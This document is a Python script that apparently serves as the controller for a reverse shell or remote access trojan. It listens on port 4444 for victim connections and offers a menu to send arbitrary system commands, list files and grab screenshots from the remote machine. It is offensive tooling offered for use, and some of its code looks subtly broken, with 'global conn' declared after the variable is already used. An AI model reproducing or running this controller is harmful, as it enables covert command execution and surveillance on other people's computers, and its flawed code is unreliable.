import socket, threading, os, sys, time
from colorama import init, Fore, Style
import base64  # Import base64
from PIL import Image  # Import Pillow library for image handling
from io import BytesIO

init(autoreset=True)

LHOST, LPORT = "0.0.0.0", 4444
conn, addr = None, None

def handle(c, a):
    global conn, addr
    conn, addr = c, a
    print(f"{Fore.GREEN}[+] Connected: {a[0]}{Style.RESET_ALL}")
    try:
        while True:
            data = c.recv(4096).decode()
            if not data: break
            print(data.strip())
    except: pass
    print(f"{Fore.RED}[-] Disconnected.{Style.RESET_ALL}")
    global conn; conn = None

def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(5)
    print(f"{Fore.CYAN}[*] Listening on {LPORT}...{Style.RESET_ALL}")
    while True:
        c, a = s.accept()
        threading.Thread(target=handle, args=(c,a), daemon=True).start()

def show_menu():
    print("\n" + Fore.YELLOW + "Menu:" + Style.RESET_ALL)
    print("1. Send custom command")
    print("2. Get current directory")
    print("3. List files in current directory")
    print("4. Run a system command (careful!)")
    print("5. Get Screenshot") # Changed this to get a single screenshot
    print("6. Quit")
    print(Fore.YELLOW + "Choose an option:" + Style.RESET_ALL)

def send_command(cmd):
    if conn:
        try:
            conn.send(cmd.encode())
        except (BrokenPipeError, ConnectionResetError):
            print(Fore.RED + "[-] Connection lost." + Style.RESET_ALL)
            global conn; conn = None
    else:
        print(Fore.RED + "[-] Not connected to a client." + Style.RESET_ALL)

def receive_screenshot():
    """Receives and displays a screenshot from the client."""
    if conn:
        try:
            conn.send("get_screenshot".encode())  # Send the command to get the screenshot
            base64_data = conn.recv(65536).decode()  # Increased buffer size
            if base64_data.startswith("[!"): # check if the base64 is not error
                print(base64_data)
                return
            try:
                img_data = base64.b64decode(base64_data)
                img = Image.open(BytesIO(img_data))
                img.show()  # Display the image using Pillow
            except Exception as e:
                print(f"{Fore.RED}[-] Error decoding or displaying image: {e}{Style.RESET_ALL}")

        except (BrokenPipeError, ConnectionResetError):
            print(Fore.RED + "[-] Connection lost." + Style.RESET_ALL)
            global conn; conn = None
    else:
        print(Fore.RED + "[-] Not connected to a client." + Style.RESET_ALL)

if __name__ == "__main__":
    threading.Thread(target=start, daemon=True).start()
    while True:
        if conn:
            show_menu()
            choice = input(f"{Fore.BLUE}shell@{addr[0]} > {Style.RESET_ALL}")

            if choice == '1':
                custom_cmd = input("Enter command: ")
                send_command(custom_cmd)
            elif choice == '2':
                send_command("pwd")  # Or 'cd' on Windows
            elif choice == '3':
                send_command("ls -l")  # Or 'dir' on Windows
            elif choice == '4':
                system_cmd = input("Enter system command (CAREFUL): ")
                send_command(system_cmd)
            elif choice == '5':  # Get Screenshot
                receive_screenshot() # Receive and display the screenshot
            elif choice == '6' or choice.lower() == 'quit':
                break
            else:
                print(Fore.RED + "[-] Invalid option." + Style.RESET_ALL)
        else:
            time.sleep(0.1)
    sys.exit(0)
